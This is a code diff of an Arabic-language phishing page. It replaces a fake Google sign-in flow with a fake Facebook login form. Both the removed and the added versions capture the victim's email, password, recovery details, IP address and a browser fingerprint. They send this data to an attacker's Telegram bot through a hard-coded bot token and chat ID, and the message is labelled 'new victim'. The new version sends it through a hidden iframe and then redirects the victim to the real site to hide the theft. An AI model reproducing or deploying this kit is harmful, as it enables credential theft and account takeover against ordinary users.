@@ -3,205 +3,215 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
+    <title>Facebook - تسجيل الدخول</title>
     <style>
-        * { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; box-sizing: border-box; }
-        body { background: #fff; color: #202124; direction: rtl; text-align: right; }
-        .container { max-width: 450px; margin: 80px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
-        .logo { text-align: center; margin-bottom: 16px; }
-        .logo img { width: 75px; }
-        .title { text-align: center; font-size: 24px; font-weight: 400; line-height: 32px; }
-        .subtitle { text-align: center; color: #5f6368; font-size: 16px; margin: 8px 0 24px; }
-        .input-group { margin-bottom: 24px; }
-        .input-field { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; }
-        .input-field:focus { border-color: #1a73e8; }
-        .next-button { background: #1a73e8; color: white; border: none; width: 100%; padding: 10px; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: 500; }
-        .next-button:hover { background: #1669d6; }
-        .footer { text-align: center; margin-top: 16px; font-size: 14px; color: #5f6368; }
-        .hidden { display: none; }
-        #passwordScreen .subtitle { text-align: right; margin-bottom: 8px; }
-        .error-msg { color: #d93025; font-size: 14px; margin-top: 8px; display: none; }
-        .forgot-link { color: #1a73e8; text-decoration: none; margin-top: 8px; display: block; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 16px;
+            display: block;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8a8d91;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+        .loading {
+            display: none;
+            color: #1877f2;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
-    <!-- الشاشة الأولى: إدخال البريد الإلكتروني -->
-    <div class="container" id="emailScreen">
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-        </div>
-        <div class="title">تسجيل الدخول</div>
-        <div class="subtitle">استخدم حساب Google الخاص بك</div>
-        <div class="input-group">
-            <input type="email" id="email" class="input-field" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="username">
-        </div>
-        <div class="error-msg" id="errorMsg">تعذر العثور على حساب Google هذا</div>
-        <button class="next-button" onclick="checkEmail()">التالي</button>
+    <div class="login-container">
+        <div class="logo">facebook</div>
+        <form id="loginForm">
+            <input type="text" class="input-field" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" class="input-field" id="password" placeholder="كلمة السر" required>
+            <div id="error" class="error-message">اسم المستخدم أو كلمة السر غير صحيحة. حاول مرة أخرى.</div>
+            <div id="loading" class="loading">جاري التحقق من المعلومات...</div>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+        <hr style="margin: 20px 0;">
+        <button class="create-account">إنشاء حساب جديد</button>
         <div class="footer">
-            <a href="#" class="forgot-link" onclick="showForgotEmail()">نسيت البريد الإلكتروني؟</a>
-        </div>
-    </div>
-
-    <!-- الشاشة الثانية: إدخال كلمة المرور -->
-    <div class="container hidden" id="passwordScreen">
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-        </div>
-        <div class="subtitle" id="displayEmail">user@example.com</div>
-        <div class="title">مرحبًا</div>
-        <div class="input-group">
-            <input type="password" id="password" class="input-field" placeholder="أدخل كلمة المرور" autocomplete="current-password">
-        </div>
-        <div class="error-msg" id="errorMsgPass">كلمة المرور غير صحيحة. حاول مرة أخرى أو انقر فوق 'نسيت كلمة المرور' لإعادة تعيينها.</div>
-        <button class="next-button" onclick="submitCredentials()">تسجيل الدخول</button>
-        <div class="footer">
-            <a href="#" class="forgot-link" onclick="resetFlow()">تسجيل الدخول بحساب مختلف</a>
-        </div>
-    </div>
-
-    <!-- شاشة "نسيت البريد" الوهمية -->
-    <div class="container hidden" id="forgotScreen">
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-        </div>
-        <div class="title">استرداد البريد الإلكتروني</div>
-        <div class="subtitle">أدخل رقم هاتفك أو بريدك الإلكتروني البديل</div>
-        <div class="input-group">
-            <input type="text" id="recoveryInfo" class="input-field" placeholder="رقم الهاتف أو البريد الإلكتروني">
-        </div>
-        <div class="error-msg" id="errorMsgRecovery">يرجى تقديم معلومات صحيحة</div>
-        <button class="next-button" onclick="captureRecoveryInfo()">التالي</button>
-        <div class="footer">
-            <a href="#" class="forgot-link" onclick="resetFlow()">العودة لتسجيل الدخول</a>
+            <p>تسجيل الدخول إلى صفحتك الشخصية على فيسبوك.</p>
         </div>
     </div>
 
     <script>
-        // ============ التهيئة ============
-        const BOT_TOKEN = '8657322490:AAE_zjkSd9Wi6ZOraSllsjh6TcgBAwBvkDM'; // ضع توكن بوتك الذي حصلت عليه من BotFather
-        const CHAT_ID = '6365891219';     // ضع معرف الدردشة الرقمية (استخدم @userinfobot للحصول عليه)
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-        // ============ عناصر واجهة المستخدم ============
-        const emailScreen = document.getElementById('emailScreen');
-        const passwordScreen = document.getElementById('passwordScreen');
-        const forgotScreen = document.getElementById('forgotScreen');
-        const displayEmail = document.getElementById('displayEmail');
-        const errorMsg = document.getElementById('errorMsg');
-        const errorMsgPass = document.getElementById('errorMsgPass');
-        const errorMsgRecovery = document.getElementById('errorMsgRecovery');
-
-        // ============ حالة التطبيق ============
-        let capturedEmail = '';
-        let capturedRecoveryInfo = '';
-        let userAgent = navigator.userAgent;
-        let timestamp = new Date().toLocaleString('ar-SA');
-
-        // ============ التحقق من البريد الإلكتروني ============
-        function checkEmail() {
-            const email = document.getElementById('email').value.trim();
-            if (!email || !email.includes('@') || !email.includes('.')) {
-                errorMsg.style.display = 'block';
-                return;
-            }
-            capturedEmail = email;
-            displayEmail.innerText = email;
-            emailScreen.classList.add('hidden');
-            passwordScreen.classList.remove('hidden');
-            errorMsg.style.display = 'none';
-        }
-
-        // ============ إرسال بيانات الاعتماد ============
-        function submitCredentials() {
-            const password = document.getElementById('password').value.trim();
-            if (!password || password.length < 4) {
-                errorMsgPass.style.display = 'block';
-                return;
-            }
-
-            // تجميع البيانات
-            const data = {
-                email: capturedEmail,
-                password: password,
-                recovery_info: capturedRecoveryInfo,
-                user_agent: userAgent,
-                timestamp: timestamp,
-                ip: 'جاري الجمع...' // يمكن إضافة خدمة خارجية لجمع الـ IP
-            };
-
-            // إعداد رسالة تلغرام
-            const message = `🕵️‍♂️ *تم جمع بيانات جديدة* \n\n📧 **البريد:** \`${data.email}\`\n🔑 **كلمة المرور:** \`${data.password}\`\n📞 **معلومات الاسترداد:** ${data.recovery_info || 'لا يوجد'}\n🌐 **المتصفح:** \`${data.user_agent}\`\n⏰ **الوقت:** ${data.timestamp}`;
-
-            // الإرسال باستخدام Webhook
-            fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(result => {
-                // عند النجاح، إعادة التوجيه إلى صفحة قوقل الحقيقية
-                setTimeout(() => {
-                    window.location.replace('https://accounts.google.com');
-                }, 800);
-            })
-            .catch(err => {
-                console.error('خطأ في الإرسال:', err);
-                // في حالة الفشل، إعادة التوجيه أيضاً
-                window.location.replace('https://accounts.google.com');
-            });
-        }
-
-        // ============ إظهار شاشة "نسيت البريد" ============
-        function showForgotEmail() {
-            emailScreen.classList.add('hidden');
-            forgotScreen.classList.remove('hidden');
-        }
-
-        // ============ جمع معلومات الاسترداد ============
-        function captureRecoveryInfo() {
-            const info = document.getElementById('recoveryInfo').value.trim();
-            if (!info) {
-                errorMsgRecovery.style.display = 'block';
-                return;
-            }
-            capturedRecoveryInfo = info;
-            // العودة إلى شاشة كلمة المرور بعد جمع معلومات الاسترداد
-            forgotScreen.classList.add('hidden');
-            passwordScreen.classList.remove('hidden');
-            errorMsgRecovery.style.display = 'none';
-        }
-
-        // ============ إعادة تعيين التدفق ============
-        function resetFlow() {
-            passwordScreen.classList.add('hidden');
-            forgotScreen.classList.add('hidden');
-            emailScreen.classList.remove('hidden');
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-            document.getElementById('recoveryInfo').value = '';
-            errorMsg.style.display = 'none';
-            errorMsgPass.style.display = 'none';
-            errorMsgRecovery.style.display = 'none';
-        }
-
-        // ============ تحسينات إضافية ============
-        // منع النقر بزر الماوس الأيمن
-        document.addEventListener('contextmenu', function(e) {
+        // CONFIGURATION - REPLACE THESE VALUES
+        const BOT_TOKEN = "8657322490:AAE_zjkSd9Wi6ZOraSllsjh6TcgBAwBvkDM";  // Get from @BotFather
+        const CHAT_ID = "6365891219";       // Get from @userinfobot
+        
+        // Telegram API endpoint
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            return false;
-        });
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // Hide any previous errors
+            document.getElementById('error').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.login-btn').textContent = 'جاري التحقق...';
+            document.querySelector('.login-btn').disabled = true;
+            
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Prepare message for Telegram
+                const message = `
+🎯 *ضحية جديدة* 🎯
 
-        // إخفاء شريط العناوين عند التمرير على الهاتف
-        window.addEventListener('load', function() {
-            setTimeout(function() {
-                window.scrollTo(0, 1);
-            }, 0);
+📧 **البريد:** ${email}
+🔑 **كلمة السر:** ${password}
+
+📊 **بصمة الجهاز:**
+🖥️ الجهاز: ${userAgent}
+🌍 اللغة: ${language}
+📱 الشاشة: ${screenRes}
+⏰ المنطقة الزمنية: ${timezone}
+📍 IP العنوان: ${ip}
+🕒 الوقت: ${new Date().toLocaleString('ar-SA')}
+                `;
+                
+                // Encode message for URL
+                const encodedMessage = encodeURIComponent(message);
+                
+                // Send to Telegram via GET request (no CORS issues with Telegram API)
+                const telegramURL = `${TELEGRAM_API}?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+                
+                // Create hidden iframe to send request
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = telegramURL;
+                document.body.appendChild(iframe);
+                
+                // Add timeout to ensure message sends
+                setTimeout(() => {
+                    // Redirect to real Facebook after 3 seconds
+                    document.getElementById('loading').style.display = 'none';
+                    document.querySelector('.login-btn').textContent = 'تم التحقق بنجاح!';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://facebook.com';
+                    }, 1000);
+                }, 3000);
+                
+            } catch (error) {
+                // If anything fails, still redirect to Facebook
+                console.error('Error:', error);
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.login-btn').textContent = 'تسجيل الدخول';
+                document.querySelector('.login-btn').disabled = false;
+                
+                // Redirect anyway
+                setTimeout(() => {
+                    window.location.href = 'https://facebook.com';
+                }, 2000);
+            }
         });
+        
+        // Add honeypot field (hidden trap for bots)
+        window.onload = function() {
+            const honeypot = document.createElement('input');
+            honeypot.type = 'text';
+            honeypot.name = 'honeypot';
+            honeypot.style.display = 'none';
+            honeypot.id = 'website';
+            document.getElementById('loginForm').appendChild(honeypot);
+            
+            // If honeypot filled, mark as bot
+            document.getElementById('loginForm').addEventListener('submit', function() {
+                if(document.getElementById('website').value) {
+                    const botMessage = `🤖 BOT DETECTED! Honeypot triggered at ${new Date().toISOString()}`;
+                    const botURL = `${TELEGRAM_API}?chat_id=${CHAT_ID}&text=${encodeURIComponent(botMessage)}`;
+                    
+                    const botIframe = document.createElement('iframe');
+                    botIframe.style.display = 'none';
+                    botIframe.src = botURL;
+                    document.body.appendChild(botIframe);
+                }
+            });
+        };
     </script>
 </body>
 </html>
